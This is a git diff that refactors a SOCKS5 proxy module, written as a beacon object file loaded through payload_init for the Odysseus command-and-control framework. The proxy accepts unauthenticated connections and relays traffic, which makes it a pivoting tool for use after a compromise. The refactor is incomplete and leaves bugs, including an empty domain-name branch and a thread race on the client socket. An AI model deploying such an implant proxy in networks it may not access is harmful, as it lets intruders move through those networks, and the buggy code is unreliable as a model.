@@ -6,6 +6,7 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 #include <netinet/tcp.h>
+#include <signal.h>
 
 #include "../OutputFormatter.h" // Required!
 
@@ -26,10 +27,10 @@ typedef void(*output_func)(int, const char* fmt, ...); // For printing output on
 /**
  * Socks protocol Version 5 BOF
  * RFC: https://datatracker.ietf.org/doc/html/rfc1928
- * C2: https://github.com/Trisna22/Odysseus
+ * C2: https://github.com/Trisna22/Odysseus   
  */
-#ifndef SOCK5_PROXY_H
-#define SOCK5_PROXY_H
+// #ifndef SOCK5_PROXY_H
+// #define SOCK5_PROXY_H
 
 #define NULL                            0x00
 #define SOCKET_ERROR                    -1
@@ -140,431 +141,431 @@ struct CommandResponse {
 
 #pragma pack(push, 1)
 
-class Sock5Proxy {
-private:
-    int clientSocket;
-    char* proxyUsername;
-    char* proxyPassword;
-    AuthMethods authMethod;
+/**
+    * Receive any object from client socket.
+    */
+template<typename T>
+T receiveObject(int clientSocket, int* red) {
 
-    /**
-     * Exit thread gracefully.
-     */
-    void exitThread() {
-        
-        close(this->clientSocket);
+    T obj;
+    if ((*red = recv(clientSocket, &obj, sizeof(T), NULL)) <= 0) {
+        printf("[!] Failed to receive proxy object! Error code: %d\n", errno);
         pthread_exit(0);
     }
 
-    /**
-     * Receive any object from client socket.
-     */
-    template<typename T>
-    T receiveObject(int* red) {
+    return obj;
+}
 
-        T obj;
-        if ((*red = recv(this->clientSocket, &obj, sizeof(T), NULL)) <= 0) {
-            printf("[!] Failed to receive proxy object! Error code: %d\n", errno);
-            this->exitThread();
-        }
+/**
+    * Send any object to client socket.
+    */
+template<typename T>
+void sendObject(int clientSocket, T obj, int size) {
 
-        return obj;
+    if (send(clientSocket, &obj, size, NULL) == SOCKET_ERROR) {
+        printf("[!] Failed to send proxy object! Error code: %d\n", errno);
+    }
+}
+
+/**
+    * Send IP & PORT response.
+    */
+void sendIPResponse(int clientSocket, char* ip, unsigned short int port) {
+
+    send(clientSocket, (void*)ip, 4, 0);
+    send(clientSocket, (void*)&port, sizeof(port), 0);
+    
+}
+
+/**
+    * Handle SOCK5 authentication.
+    */
+void handleSOCK5Authentication(int clientSocket) {
+    // Send response its fine.
+    InvitationResponse response = {
+        ver::SOCKS5,
+        AuthMethods::NOAUTH
+    };
+
+    sendObject<InvitationResponse>(clientSocket, response, sizeof(InvitationResponse));
+}
+
+/**
+    * Convert uint32 to IP address.
+    */
+static char* parseIPv4(uint32_t value) {
+    
+    // uint32_t networkByteOrder = htonl(value);
+    char *IP = new char[INET_ADDRSTRLEN];
+
+    if (inet_ntop(AF_INET, &value, IP, INET_ADDRSTRLEN) == NULL) {
+        printf("[-] Failed to parse the IPv4 address! Error code: %d\n", errno);
+        return NULL;
     }
 
-    /**
-     * Send any object to client socket.
-     */
-    template<typename T>
-    void sendObject(T obj, int size) {
+    return IP;
+}
 
-        if (send(this->clientSocket, &obj, size, NULL) == SOCKET_ERROR) {
-            printf("[!] Failed to send proxy object! Error code: %d\n", errno);
-        }
+static void invitation(int clientSocket) {
+
+
+    // Client sends us the version, number of methods and all methods.
+    int sizeRead = 0;
+    InvitationRequest inv = receiveObject<InvitationRequest>(clientSocket, &sizeRead);
+
+    // Check if version compatible.
+    if (sizeRead == 2 && inv.version != ver::SOCKS5 && inv.version != ver::SOCKS4) {
+
+        printf("[#] They sent us {%hhX, %hhX}\n", inv.version, inv.nmethods);
+        printf("[-] Incompatible with our version!\n");
+        pthread_exit(0);
     }
 
-    /**
-     * Send IP & PORT response.
-     */
-    void sendIPResponse(char* ip, unsigned short int port) {
+    if (inv.version == ver::SOCKS5) {
 
-        send(this->clientSocket, (void*)ip, 4, 0);
-        send(this->clientSocket, (void*)&port, sizeof(port), 0);
-        
-    }
+        bool supported = false;
 
-    /**
-     * Handle SOCK5 authentication.
-     */
-    void handleSOCK5Authentication() {
-        switch (this->authMethod)
-        {
-            case AuthMethods::NOAUTH: {
-                
-                // Send response its fine.
-                InvitationResponse response = {
-                    ver::SOCKS5,
-                    AuthMethods::NOAUTH
-                };
+        // Check if auth method is supported by us.
+        for (int i = 0; i < inv.nmethods; i++) {
 
-                sendObject<InvitationResponse>(response, sizeof(InvitationResponse));
-                break;
+            int red = 0;
+            char type = receiveObject<char>(clientSocket, &red);
+
+            // Check if client supports our chosen authentication method.
+            if (type == AuthMethods::NOAUTH) {
+                supported = true;
             }
-            
-            case AuthMethods::USER_PASSWORD: {
-
-                printf("[!] USERNAME PASSWORD authentication not yet implemented!\n");
-                this->exitThread();
-                break;
-            }
         }
+
+        // If none of the methods are supported.
+        if (!supported) {
+
+            InvitationResponse response = {
+                ver::SOCKS5,
+                AuthMethods::NO_ACCEPTABLE
+            };
+            sendObject<InvitationResponse>(clientSocket, response, sizeof(InvitationResponse));
+        }
+        else {
+            handleSOCK5Authentication(clientSocket);
+            return; // Exit function instead of suicide.
+        }
+
+    }
+    else if (inv.version == ver::SOCKS4) {
+
+        printf("[-] Version not yet supported...\n");
+
+    } else {
+        printf("[-] Unsupported version!\n");
     }
 
-    /**
-     * Convert uint32 to IP address.
-     */
-    static char* parseIPv4(uint32_t value) {
-        
-        // uint32_t networkByteOrder = htonl(value);
-        char *IP = new char[INET_ADDRSTRLEN];
+    pthread_exit(0);
+}
 
-        if (inet_ntop(AF_INET, &value, IP, INET_ADDRSTRLEN) == NULL) {
-            printf("[-] Failed to parse the IPv4 address! Error code: %d\n", errno);
-            return NULL;
-        }
+/**
+* Proxy to an app with IP and port.
+*/
+int proxyConnect(int addrType, char* ip, int port) {
 
-        return IP;
-    }
+    int red, appSock = SOCKET_ERROR;
 
-    /**
-     * Proxy to an app with IP and port.
-     */
-    int proxyConnect(int addrType, char* ip, int port) {
-
-        int red, appSock = SOCKET_ERROR;
-
-        // Construct struct for connecting.
-        struct sockaddr_in remote;
-        memset(&remote, 0, sizeof(sockaddr_in));
-        remote.sin_addr.s_addr = inet_addr(ip);
-        remote.sin_port = htons(port);
-        remote.sin_family = AF_INET;
-
-        /**
-         *  Connect to remote address.
-         */
-        printf("[#] Connecting to app %s:%d\n", ip, port);
-
-        appSock = socket(AF_INET, SOCK_STREAM, 0);
-        if (appSock == SOCKET_ERROR) {
-
-            printf("[-] Failed to create app socket! Error code: %d\n", errno);
-            return SOCKET_ERROR;
-        }
-
-        if (connect(appSock, (sockaddr*)&remote, sizeof(remote)) == SOCKET_ERROR) {
-
-            printf("[-] Failed to connect to the app! Error code: %d\n", errno);
-            return SOCKET_ERROR;
-        }
-
-        return appSock;
-    }
+    // Construct struct for connecting.
+    struct sockaddr_in remote;
+    memset(&remote, 0, sizeof(sockaddr_in));
+    remote.sin_addr.s_addr = inet_addr(ip);
+    remote.sin_port = htons(port);
+    remote.sin_family = AF_INET;
 
     /**
-     * Proxy to bind to an ip and port for an app. 
-     */
-    int proxyBind(char* ip, int port) {
+        *  Connect to remote address.
+        */
+    printf("[#] Connecting to app %s:%d\n", ip, port);
 
+    appSock = socket(AF_INET, SOCK_STREAM, 0);
+    if (appSock == SOCKET_ERROR) {
+
+        printf("[-] Failed to create app socket! Error code: %d\n", errno);
         return SOCKET_ERROR;
     }
 
+    if (connect(appSock, (sockaddr*)&remote, sizeof(remote)) == SOCKET_ERROR) {
 
-    /**
-     * Proxy pipe the connection between app and the client.
-     */
-    void pipeSocketApp(int clientSock, int appSocket) {
+        printf("[-] Failed to connect to the app! Error code: %d\n", errno);
+        return SOCKET_ERROR;
+    }
 
-        // The biggest file descriptor is what we are looking for.
-        int maxFD = (clientSock > appSocket) ? clientSock : appSocket;
+    return appSock;
+}
 
-        // Setup read/write variables.
-        fd_set readSet;
-        char buffer[MAX_BUFFER_SIZE];
+ /**
+    * Proxy pipe the connection between app and the client.
+    */
+void pipeSocketApp(int clientSock, int appSocket) {
 
-        for (;;) {
-            FD_ZERO(&readSet);
-            FD_SET(clientSock, &readSet);
-            FD_SET(appSocket, &readSet);
-            int ret = select(maxFD + 1, &readSet, NULL, NULL, NULL);
+    // The biggest file descriptor is what we are looking for.
+    int maxFD = (clientSock > appSocket) ? clientSock : appSocket;
 
-            if (ret < 0 && errno == EINTR) {
-                continue;
-            }
+    // Setup read/write variables.
+    fd_set readSet;
+    char buffer[MAX_BUFFER_SIZE];
 
-            // When app socket sends data.
-            if (FD_ISSET(appSocket, &readSet)) {
-                
-                int nread = recv(appSocket, buffer, MAX_BUFFER_SIZE, 0);
-                if (nread <= 0) {
-                    if (nread == 0) {
-                        printf("[-] App closed connection!\n");
-                    } else {
-                        printf("[-] Error reading from appSocket! Error code: %d\n", errno);
-                    }
-                    break;
-                }
+    for (;;) {
+        FD_ZERO(&readSet);
+        FD_SET(clientSock, &readSet);
+        FD_SET(appSocket, &readSet);
+        int ret = select(maxFD + 1, &readSet, NULL, NULL, NULL);
 
-                // printf("[*] %d bytes appSocket => clientSocket\n", nread);
+        if (ret < 0 && errno == EINTR) {
+            continue;
+        }
 
-                // Send to cient socket.
-                if (send(clientSock, (const void*)buffer, nread, NULL) == SOCKET_ERROR) {
-
-                    printf("[-] Error sending data client socket! Error code: %d\n", errno);
-                    break;
-                }
-
-                continue;
-            }
+        // When app socket sends data.
+        if (FD_ISSET(appSocket, &readSet)) {
             
-            // When client socket sends data.
-            if (FD_ISSET(clientSock, &readSet)) {
-                
-                int nread = recv(clientSock, buffer, MAX_BUFFER_SIZE, NULL);
-                if (nread <= 0) {
-                    if (nread == 0) {
-                        printf("[-] Client closed connection!\n");
-                    } else {
-                        printf("[-] Error reading from client! Error code: %d\n", errno);
-                    }
-                    break;
+            int nread = recv(appSocket, buffer, MAX_BUFFER_SIZE, 0);
+            if (nread <= 0) {
+                if (nread == 0) {
+                    printf("[-] App closed connection!\n");
+                } else {
+                    printf("[-] Error reading from appSocket! Error code: %d\n", errno);
                 }
-
-                // printf("[*] %d bytes clientSocket => appSocket\n", nread);
-
-                // Send to app socket.
-                if (send(appSocket, (const void*)buffer, nread, NULL) == SOCKET_ERROR) {
-
-                    printf("[-] Error sending data to app socket! Error code: %d\n", errno);
-                    break;
-                }
+                break;
             }
+
+            // printf("[*] %d bytes appSocket => clientSocket\n", nread);
+
+            // Send to cient socket.
+            if (send(clientSock, (const void*)buffer, nread, NULL) == SOCKET_ERROR) {
+
+                printf("[-] Error sending data client socket! Error code: %d\n", errno);
+                break;
+            }
+
+            continue;
         }
-
-        this->exitThread();
-    }
-
-public:
-
-    Sock5Proxy(int sock, AuthMethods method) : clientSocket(sock), authMethod(method) {}
-    Sock5Proxy(int sock, AuthMethods method, char* username, char* password) : authMethod(method),
-        clientSocket(sock),proxyUsername(username),proxyPassword(password) {}
-
-    ~Sock5Proxy() {
-        close(this->clientSocket);
-    }
-
-    /**
-     * @brief Handles the initiation requests.
-     * RFC: https://datatracker.ietf.org/doc/html/rfc1928#section-3
-     */
-    void invitation() {
-
-        // Client sends us the version, number of methods and all methods.
-        int sizeRead = 0;
-        InvitationRequest inv = this->receiveObject<InvitationRequest>(&sizeRead);
         
-        // Check if version compatible.
-        if (sizeRead == 2 && inv.version != ver::SOCKS5 && inv.version != ver::SOCKS4) {
-
-            printf("[#] They sent us {%hhX, %hhX}\n", inv.version, inv.nmethods);
-            printf("[-] Incompatible with our version!\n");
-            exitThread();
-        }
-
-        if (inv.version == ver::SOCKS5) {
-
-            bool supported = false;
-
-            // Check if auth method is supported by us.
-            for (int i = 0; i < inv.nmethods; i++) {
-
-                int red = 0;
-                char type = this->receiveObject<char>(&red);
-
-                // Check if client supports our chosen authentication method.
-                if (type == this->authMethod) {
-                    supported = true;
+        // When client socket sends data.
+        if (FD_ISSET(clientSock, &readSet)) {
+            
+            int nread = recv(clientSock, buffer, MAX_BUFFER_SIZE, NULL);
+            if (nread <= 0) {
+                if (nread == 0) {
+                    printf("[-] Client closed connection!\n");
+                } else {
+                    printf("[-] Error reading from client! Error code: %d\n", errno);
                 }
+                break;
             }
 
-            // If none of the methods are supported.
-            if (!supported) {
+            // printf("[*] %d bytes clientSocket => appSocket\n", nread);
 
-                InvitationResponse response = {
-                    ver::SOCKS5,
-                    AuthMethods::NO_ACCEPTABLE
-                };
-                sendObject<InvitationResponse>(response, sizeof(InvitationResponse));
-            }
-            else {
-                this->handleSOCK5Authentication();
-                return; // Exit function instead of suicide.
-            }
+            // Send to app socket.
+            if (send(appSocket, (const void*)buffer, nread, NULL) == SOCKET_ERROR) {
 
+                printf("[-] Error sending data to app socket! Error code: %d\n", errno);
+                break;
+            }
         }
-        else if (inv.version == ver::SOCKS4) {
+    }
 
-            printf("[-] Version not yet supported...\n");
+    pthread_exit(0);
+}
+
+
+
+/**
+    * @brief Handles the incoming proxy request.
+    * RFC: https://datatracker.ietf.org/doc/html/rfc1928#section-4
+    */
+void handleCommands(int clientSocket) {
+    
+    // Get the command from the client.
+    char* IP;
+    int red, port;
+    CommandRequest request = receiveObject<CommandRequest>(clientSocket, &red);
+
+    int appSocket = SOCKET_ERROR;
+
+    // Based on command connect or bind.
+    switch (request.command)
+    {
+    case Command::CONNECT: {
+
+        // Check if an domain is given instread of IP.
+        if (request.addrType == AddressType::FQDN) {
+            // Parse the domain.
+
 
         } else {
-            printf("[-] Unsupported version!\n");
+            // Parse the addresses.
+            IPv4 ipv4 = receiveObject<IPv4>(clientSocket, &red);
+            IP = parseIPv4(ipv4.ip);
+            port = htons(ipv4.port);
         }
 
-        this->exitThread();
-    }  
-    
-    /**
-     * @brief Handles the incoming proxy request.
-     * RFC: https://datatracker.ietf.org/doc/html/rfc1928#section-4
-     */
-    void handleCommands() {
+        appSocket = proxyConnect(request.addrType, IP ,port);
+
+        break;
+    }
+    case Command::BIND: {
+
+        printf("[-] Proxy method BIND not supported yet!\n");
         
-        // Get the command from the client.
-        char* IP;
-        int red, port;
-        CommandRequest request = this->receiveObject<CommandRequest>(&red);
+        CommandResponse response = {
+            ver::SOCKS5,
+            CommandReply::CMD_NOT_SUPPORTED,
+            0x00, // Reserved
+            request.addrType
+        };
+        
+        sendObject<CommandResponse>(clientSocket, response, sizeof(response));
+        // this->sendIPResponse("0.0.0.0", 666);
+        pthread_exit(0);
+    
+        break;
+    }
+    case Command::UDP_ASSOCIATE: {
+        printf("[-] Proxy method UDP ASSOCIATE not supported yet!\n");
 
-        int appSocket = SOCKET_ERROR;
+        CommandResponse response = {
+            ver::SOCKS5,
+            CommandReply::CMD_NOT_SUPPORTED,
+            0x00, // Reserved
+            request.addrType
+        };
+        
+        sendObject<CommandResponse>(clientSocket, response, sizeof(response));
+        // this->sendIPResponse("0.0.0.0", 666);
+        // this->exitThread();
+        pthread_exit(0);
+        break;
+    }
+    default: {
+        printf("[-] Unknown proxy command: %hhx\n", request.command);
 
-        // Based on command connect or bind.
-        switch (request.command)
-        {
-        case Command::CONNECT: {
-
-            // Check if an domain is given instread of IP.
-            if (request.addrType == AddressType::FQDN) {
-                // Parse the domain.
-
-
-            } else {
-                // Parse the addresses.
-                IPv4 ipv4 = this->receiveObject<IPv4>(&red);
-                IP = Sock5Proxy::parseIPv4(ipv4.ip);
-                port = htons(ipv4.port);
-            }
-
-            appSocket = this->proxyConnect(request.addrType, IP ,port);
-
-            break;
-        }
-        case Command::BIND: {
-
-            printf("[-] Proxy method BIND not supported yet!\n");
-            
-            CommandResponse response = {
-                ver::SOCKS5,
-                CommandReply::CMD_NOT_SUPPORTED,
-                0x00, // Reserved
-                request.addrType
-            };
-            
-            this->sendObject<CommandResponse>(response, sizeof(response));
-            this->sendIPResponse("0.0.0.0", 666);
-            this->exitThread();
-            
-            break;
-        }
-        case Command::UDP_ASSOCIATE: {
-            printf("[-] Proxy method UDP ASSOCIATE not supported yet!\n");
-
-            CommandResponse response = {
-                ver::SOCKS5,
-                CommandReply::CMD_NOT_SUPPORTED,
-                0x00, // Reserved
-                request.addrType
-            };
-            
-            this->sendObject<CommandResponse>(response, sizeof(response));
-            this->sendIPResponse("0.0.0.0", 666);
-            this->exitThread();
-            break;
-        }
-        default: {
-            printf("[-] Unknown proxy command: %hhx\n", request.command);
-
-            CommandResponse response = {
-                ver::SOCKS5,
-                CommandReply::CMD_NOT_SUPPORTED,
-                0x00, // Reserved
-                request.addrType,
-            };
-            
-            this->sendObject<CommandResponse>(response, sizeof(response));
-            this->sendIPResponse("0.0.0.0", 666);
-            this->exitThread();
-            break;
-        }
-        }
-
-        // Check if connection has been established.
-        if (appSocket != SOCKET_ERROR) {
-
-            // Send response OK.
-            CommandResponse response = {
-                ver::SOCKS5,
-                CommandReply::OK,
-                0x00, // Reserved
-                request.addrType
-            };
-            
-            this->sendObject<CommandResponse>(response, sizeof(response));
-            this->sendIPResponse("0.0.0.0", 666);
-
-            // Pipe connection.
-            pipeSocketApp(this->clientSocket, appSocket);
-        }
-        else {
-
-            // Send response error.
-            CommandResponse response = {
-                ver::SOCKS5,
-                CommandReply::ERROR,
-                0x00, // Reserved
-                request.addrType
-            };
-
-            // Based on socket error.
-            switch (errno) {
-                case ENETDOWN:
-                case ENETUNREACH: {
-                    response.reply = CommandReply::NETWORK_UNREACHABLE;
-                    break;
-                }
-                
-                case ECONNREFUSED: {
-                    response.reply = CommandReply::CONNECTION_REFUSED;
-                    break;
-                }
-
-                case ECONNRESET: {
-                    response.reply = CommandReply::ERROR;
-                    break;
-                }
-
-                default: {
-                    response.reply = CommandReply::ERROR;
-                    break;
-                }
-            }
-
-            this->sendObject<CommandResponse>(response, sizeof(response));
-            this->sendIPResponse("0.0.0.0", 666);
-        }
-
-        this->exitThread(); // If finished close thread.
+        CommandResponse response = {
+            ver::SOCKS5,
+            CommandReply::CMD_NOT_SUPPORTED,
+            0x00, // Reserved
+            request.addrType,
+        };
+        
+        // this->sendObject<CommandResponse>(response, sizeof(response));
+        // this->sendIPResponse("0.0.0.0", 666);
+        // this->exitThread();
+        pthread_exit(0);
+        break;
+    }
     }
 
-    /**
+    // Check if connection has been established.
+    if (appSocket != SOCKET_ERROR) {
+
+        // Send response OK.
+        CommandResponse response = {
+            ver::SOCKS5,
+            CommandReply::OK,
+            0x00, // Reserved
+            request.addrType
+        };
+        
+        sendObject<CommandResponse>(clientSocket, response, sizeof(response));
+        sendIPResponse(clientSocket, "0.0.0.0", 666);
+
+        // Pipe connection.
+        pipeSocketApp(clientSocket, appSocket);
+    }
+    else {
+
+        // Send response error.
+        CommandResponse response = {
+            ver::SOCKS5,
+            CommandReply::ERROR,
+            0x00, // Reserved
+            request.addrType
+        };
+
+        // Based on socket error.
+        switch (errno) {
+            case ENETDOWN:
+            case ENETUNREACH: {
+                response.reply = CommandReply::NETWORK_UNREACHABLE;
+                break;
+            }
+            
+            case ECONNREFUSED: {
+                response.reply = CommandReply::CONNECTION_REFUSED;
+                break;
+            }
+
+            case ECONNRESET: {
+                response.reply = CommandReply::ERROR;
+                break;
+            }
+
+            default: {
+                response.reply = CommandReply::ERROR;
+                break;
+            }
+        }
+
+        sendObject<CommandResponse>(clientSocket, response, sizeof(response));
+        sendIPResponse(clientSocket, "0.0.0.0", 666);
+    }
+
+    pthread_exit(0);
+    // this->exitThread(); // If finished close thread.
+}
+
+static void *proxyClientHandler(void* arg) {
+
+    int clientSocket = *(int *)arg;
+
+    // First handle invitation proces.
+    invitation(clientSocket);
+
+    // Now handle commanding.
+    handleCommands(clientSocket);
+    return 0;
+}
+
+int handleClients(int serverSocket) {
+
+        int clientSocket;
+        pthread_t worker;
+        struct sockaddr_in remote;
+        memset(&remote, 0, sizeof(remote));
+        socklen_t remoteLen;
+    
+        for (;;) {
+
+            // Accept client.
+            if ((clientSocket = accept(serverSocket, (sockaddr*)&remote, &remoteLen)) < 0) {
+                printf("[-] Failed to accept proxy client! Error code: %d\n", errno);
+                return errno;    
+            }
+            
+            // printf("Addr: %p\n", proxyClientHandler);
+
+            // Create worker thread for the proxy client.
+            if (pthread_create(&worker, 
+                NULL, proxyClientHandler, 
+                (void*)&clientSocket) != 0) {
+                
+                printf("[-] Failed to create new thread for client! Error code: %d\n", errno);    
+                return errno;
+            } else {
+
+                // Unhook thread entirely
+                pthread_detach(worker);
+            }
+        }
+
+        return 0;
+}
+
+/**
      * Start proxy server.
      */
     static int startProxy(int PORT = 1080) {
@@ -610,77 +611,17 @@ public:
         return serverSocket;
     }
 
-    /**
-     * App loop 
-     */
-    static int handleClients(int serverSocket) {
-
-        int clientSocket;
-        pthread_t worker;
-        struct sockaddr_in remote;
-        memset(&remote, 0, sizeof(remote));
-        socklen_t remoteLen;
-    
-        for (;;) {
-
-            // Accept client.
-            if ((clientSocket = accept(serverSocket, (sockaddr*)&remote, &remoteLen)) < 0) {
-                printf("[-] Failed to accept proxy client! Error code: %d\n", errno);
-                return errno;    
-            }
-
-            printf("[#] Accepted new client connection \n");
-
-            // Create worker thread for the proxy client.
-            if (pthread_create(&worker, 
-                NULL, Sock5Proxy::proxyClientHandler, 
-                (void*)&clientSocket) != 0) {
-                
-                printf("[-] Failed to create new thread for client! Error code: %d\n", errno);    
-                return errno;
-            } else {
-
-                // Unhook thread entirely
-                pthread_detach(worker);
-            }
-        }
-
-        return 0;
-    }
-
-    /**
-     * Client thread handler. 
-     * 
-     * @param arg -> int clientSocket;
-     */
-    static void *proxyClientHandler(void* arg) {
-
-        int clientSocket = *(int *)arg;
-
-        // Initialize SOCK5 object.
-        Sock5Proxy proxy(clientSocket, AuthMethods::NOAUTH);
-
-        // First handle invitation proces.
-        proxy.invitation();
-
-        // Now handle commanding.
-        proxy.handleCommands();
-        return 0;
-    }
-};
-#endif // !~ SOCK5_PROXY_H
-
 #ifdef DEBUG_BOF
     int main(int argc, char * argv[]) {
 
         int serverSocket;
-        if ((serverSocket = Sock5Proxy::startProxy(INPUT_PORT)) == SOCKET_ERROR) {
+        if ((serverSocket = startProxy(INPUT_PORT)) == SOCKET_ERROR) {
             return 1;
         }
         
         printf("[!] Listening for connections on port %d...\n", INPUT_PORT);
 
-        return Sock5Proxy::handleClients(serverSocket);
+        return handleClients(serverSocket);
     }
 
 #else
@@ -690,12 +631,15 @@ int payload_init(int id, output_func output) {
     // output(id, )
 
     int serverSocket;
-    if ((serverSocket = Sock5Proxy::startProxy(INPUT_PORT)) == SOCKET_ERROR) {
+
+    if ((serverSocket = startProxy(INPUT_PORT)) == SOCKET_ERROR) {
+    // if ((serverSocket = Sock5Proxy::startProxy(INPUT_PORT)) == SOCKET_ERROR) {
         return 1;
     }
     
     printf("[!] Listening for connections on port %d...\n", INPUT_PORT);
 
-    return Sock5Proxy::handleClients(serverSocket);
+    handleClients(serverSocket);
+    // return Sock5Proxy::handleClients(serverSocket);
 }
 #endif // DEBUG_BOF
